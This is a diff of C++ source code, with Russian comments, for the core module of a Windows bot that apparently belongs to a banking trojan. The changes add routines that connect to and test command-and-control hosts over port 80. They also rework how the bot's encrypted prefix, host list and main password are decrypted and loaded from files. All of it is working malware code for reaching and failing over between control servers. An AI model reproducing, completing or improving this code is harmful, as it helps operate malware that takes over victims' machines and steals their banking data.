@@ -1,14 +1,11 @@
 #include <windows.h>
-#include <shlobj.h>
+//#include <shlobj.h>
 
 #include "Config.h"
 #include "GetApi.h"
 #include "Memory.h"
 #include "Strings.h"
 #include "Utils.h"
-#include "Crypt.h"
-#include "BotHosts.h"
-#include "BotClasses.h"
 #include "BotCore.h"
 
 
@@ -225,6 +222,23 @@ bool IsBankingMode()
 
 #endif
 
+
+
+//****************************************************
+//  Включаем использование префикса из файла
+//
+//  В данный момент используем ход через залницу
+//
+//  При включении использования хостов из файла
+//  мы автоматически включаем использование файла
+//  префикса
+//****************************************************
+#if !defined(USE_PREFIX_FILE) && defined(BotHostsH)
+	#define USE_PREFIX_FILE
+#endif
+
+
+
 string GetPrefix(bool CheckBankingMode)
 {
 	// Функция возвращает префикс бота
@@ -238,7 +252,7 @@ string GetPrefix(bool CheckBankingMode)
 
 	string Prefix;
 
-	#ifdef USE_HOSTS_FILE
+	#ifdef USE_PREFIX_FILE
 		LoadPrefixFromFile(Bot->PrefixFileName().t_str());
 	#endif
 
@@ -246,7 +260,7 @@ string GetPrefix(bool CheckBankingMode)
 	{
 		Prefix = BOT_PREFIX;
 		if (BOTPARAM_ENCRYPTED_PREFIX)
-			Decrypt(Prefix.t_str(), Prefix.t_str());
+			DecryptStr(Prefix.t_str(), Prefix.t_str());
     }
 
     return Prefix;
@@ -388,7 +402,7 @@ string GetActiveHost(bool CheckBankingMode)
 	bool FileExists = false;
 	string Host;
 
-	#if !defined(DEBUGCONFIG) && defined(USE_HOSTS_FILE)
+	#if !defined(DEBUGCONFIG) && defined(BotHostsH)
 		PCHAR H  = NULL;
 
 		// Первым этапом пытаемся получить хост из файла
@@ -451,6 +465,74 @@ bool IsMainHost(const char* Host)
 //-----------------------------------------------------------------------------
 
 
+
+//-------------------------------------------------------
+// Функция подключается к указанному 80 порту указанного
+// сервера.
+// Аналогичная функция есть в модуле HTTP, однако для
+// автономности кода функцию продублировали здесь
+//-------------------------------------------------------
+SOCKET __ConnectToHost(const char* Host)
+{
+	// Инициализируем библиотеку
+	// Инициализируем библиотеку
+	WSADATA wsa;
+	ClearStruct(wsa);
+	DWORD Code = (DWORD)pWSAStartup(MAKEWORD( 2, 2 ), &wsa);
+	if (Code != 0) return INVALID_SOCKET;
+
+
+	// Получаем  адрес по имени хоста
+	LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname((const char*)Host);
+
+	if ( lpHost == NULL )
+		return SOCKET_ERROR;
+
+	// Открываем хост
+	SOCKET Socket = (SOCKET)psocket(AF_INET, SOCK_STREAM, 0);
+
+	if( Socket == SOCKET_ERROR )
+		return Socket;
+
+	struct sockaddr_in SockAddr;
+
+	ClearStruct(SockAddr);
+
+	SockAddr.sin_family		 = AF_INET;
+	SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
+	SockAddr.sin_port		 = HTONS((unsigned short)80);
+
+	// подключаемся к сокету
+	if ( (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) == SOCKET_ERROR )
+	{
+		//int Error = WSAGetLastError();
+		pclosesocket( Socket );
+		return SOCKET_ERROR;
+	}
+	return Socket;
+}
+
+
+//-------------------------------------------------------
+// Функция проверяет работоспособность указанного хоста
+//-------------------------------------------------------
+bool CheckHost(const char* Host)
+{
+  // Функция проверяет работоспособность хоста
+
+	if (STRA::IsEmpty(Host))
+		return false;
+
+	SOCKET Socket = __ConnectToHost(Host);
+
+	bool Result = (Socket != INVALID_SOCKET);
+
+	pclosesocket(Socket);
+	return Result;
+}
+//-----------------------------------------------------------------------------
+
+
 PCHAR GetActiveHostFromBuf(PCHAR Hosts, DWORD EmptyArrayHash)
 {
 	//  Функция возвращает хост из буфера
@@ -471,9 +553,9 @@ PCHAR GetActiveHostFromBuf(PCHAR Hosts, DWORD EmptyArrayHash)
 		PCHAR Result = STR::New(Host);
 
 		if (BOTPARAM_ENCRYPTED_MAINHOSTS)
-			Decrypt(Host, Result);
+			DecryptStr(Host, Result);
 
-		if (Hosts::CheckHost(Result))
+		if (CheckHost(Result))
 			return Result;
 
 		STR::Free(Result);
@@ -496,7 +578,7 @@ string GetActiveHostFromBuf2(const char* Hosts, DWORD EmptyArrayHash, bool Encry
 
 	while (E.Next())
 	{
-		if (Hosts::CheckHost(E.Line().t_str()))
+		if (CheckHost(E.Line().t_str()))
 		{
 			Result = E.Line();
 			break;
@@ -509,9 +591,13 @@ string GetActiveHostFromBuf2(const char* Hosts, DWORD EmptyArrayHash, bool Encry
 
 //------------------------------------------------------------------
 //  SaveHostsToFile - Функция записывает носты в файл
+//
+//  Функция будет работать только в случае подключенного
+//  одуля BotHosts.h
 //------------------------------------------------------------------
 void SaveHostsToFile(const char* FileName)
 {
+#ifdef BotHostsH
 	if (STRA::IsEmpty(FileName))
 		return;
 
@@ -528,7 +614,8 @@ void SaveHostsToFile(const char* FileName)
 	if (Added)
 		Hosts::SaveListToFile(List, (PCHAR)FileName, true);
 
-    Hosts::FreeList(List);
+	Hosts::FreeList(List);
+#endif
 }
 //-----------------------------------------------------------------------------
 
@@ -545,9 +632,9 @@ void SavePrefixToFile(const char* FileName)
 	if (!BOTPARAM_ENCRYPTED_PREFIX)
 	{
 		// При необходимости, шифруем префикс
-		Decrypt(Prefix.t_str(), Prefix.t_str());
+		DecryptStr(Prefix.t_str(), Prefix.t_str());
     }
-	File::WriteBufferA((PCHAR)FileName, Prefix.t_str(), Prefix.Length());
+	File::WriteBufferA(FileName, Prefix.t_str(), Prefix.Length());
 }
 //-----------------------------------------------------------------------------
 
@@ -557,10 +644,11 @@ void SavePrefixToFile(const char* FileName)
 //------------------------------------------------------------------
 string LoadPrefixFromFile(const char* FileName)
 {
-	TBotFileStream File(FileName, fcmRead);
-	string Prefix = File.ReadToString();
+	DWORD  Sz  = 0;
+	PCHAR Buf = (PCHAR)File::ReadToBufferA(FileName, Sz);
+	string Prefix(Buf, Sz);
 	if (!Prefix.IsEmpty())
-    	Decrypt(Prefix.t_str(), Prefix.t_str());
+    	DecryptStr(Prefix.t_str(), Prefix.t_str());
 
 	return Prefix;
 }
@@ -621,7 +709,7 @@ PCHAR GetMainPassword(bool NotNULL)
 	{
 		Passw = STR::New(MainPassword);
         if (BOTPARAM_ENCRYPTED_PASSWORD)
-			Decrypt(MainPassword, Passw);
+			DecryptStr(MainPassword, Passw);
 	}
 
 
@@ -646,7 +734,7 @@ string GetMainPassword2(bool NotNULL)
 	{
 		Pass = MainPassword;
         if (BOTPARAM_ENCRYPTED_PASSWORD)
-			Decrypt(MainPassword, Pass.t_str());
+			DecryptStr(MainPassword, Pass.t_str());
 	}
 
 	// В случае необходимости возвращаем cтандартный пароль
@@ -768,7 +856,7 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 			ParamID == BOT_PARAM_PREFIX ||
 			ParamID == BOT_PARAM_KEY)
 		{
-			Decrypt(Buffer, Buffer);
+			DecryptStr(Buffer, Buffer);
 		}
 	#endif
 
@@ -860,3 +948,7 @@ BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param)
 	return TRUE;
 }
 //----------------------------------------------------------------------------
+
+
+
+
